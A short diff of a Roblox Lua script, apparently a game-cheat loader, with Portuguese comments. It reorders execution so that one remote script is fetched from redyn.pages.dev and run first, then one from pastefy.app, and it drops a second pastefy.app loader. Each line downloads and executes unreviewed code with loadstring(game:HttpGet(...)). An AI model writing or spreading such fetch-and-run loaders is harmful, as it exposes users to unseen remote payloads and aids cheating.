@@ -246,18 +246,16 @@ getgenv().TARGET_BRAINROTS = {
 }
 
 -- =========================
--- EXECUÇÃO DOS SCRIPTS
+-- EXECUÇÃO (INVERTIDO)
 -- =========================
 
--- Primeiro script
+-- REDYN PRIMEIRO (GUI)
+loadstring(game:HttpGet("https://redyn.pages.dev/Loader/Universel"))()
+
+-- espera carregar
+task.wait(5)
+
+-- SCRIPT EM SEGUNDO
 task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/RlAPK90a/raw"))()
-end)
-
--- Delay para evitar conflito
-task.wait(10)
-
--- Segundo script
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/uBz7VCir/raw"))()
 end)
